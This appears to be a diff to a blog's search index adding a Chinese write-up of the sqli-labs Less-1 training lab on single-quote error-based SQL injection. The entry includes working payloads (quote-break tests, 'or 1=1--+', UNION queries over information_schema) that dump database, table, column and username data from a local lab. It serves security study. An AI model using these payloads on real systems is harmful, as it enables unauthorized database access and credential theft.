@@ -4,6 +4,33 @@
   
     
     <entry>
+      <title>Sqli-Labs-Less-1 单引号报错注入</title>
+      <link href="/sql-injection/bdc437f9.html"/>
+      <url>/sql-injection/bdc437f9.html</url>
+      
+        <content type="html"><![CDATA[<p>源码中的sql语句是<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code>, 单引号闭合。<br>首先按照输入<code>/?id=1</code>, 显示一个正常的账号密码<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241017102338.png" alt="/id=1" style="zoom: 33%;" /></p><p>输入<code>id=1&#39;</code>进行测试，产生报错，存在注入点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241017102559.png" alt="id=1'" style="zoom: 33%;" /></p><p>使用<code>/?id=1&#39; or 1=1--+</code>，返回正常的一个结果。<br>使用<code>union</code>进行联合查询：<code>/?id=-1 union select 1,database(),3</code>，返回数据库名称<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241017103525.png" alt="union联合查询" style="zoom:50%;" /></p><p>查询所有的数据库，并使用<code>group_concat()</code>连接字符串：<code>http://127.0.0.1/sqli-labs/Less-1/?id=-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241017142242.png" alt="union查询" style="zoom:33%;" /></p><p>查询<code>security</code>库中所有的表<br><code>select table_name from information_schema.tables where table_schema=&#39;security&#39;</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241018095957.png" alt="security中所有表" style="zoom:33%;" /></p><p>查询<code>security</code>库中<code>users</code>表中的列<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39;</code><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241018095255.png" alt="uses表的列" style="zoom:33%;" /></p><p>查询<code>users</code>列中<code>username</code>所有值<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20241018100412.png" alt="username中的所有值" style="zoom:33%;" /></p><p>阅读less-1的源码,<code>id</code>是单引号闭合。<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> WEB </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> WEB </tag>
+            
+            <tag> sql-injection </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Windows7下使用ps脚本进行端口扫描</title>
       <link href="/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/add7b52b.html"/>
       <url>/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/add7b52b.html</url>
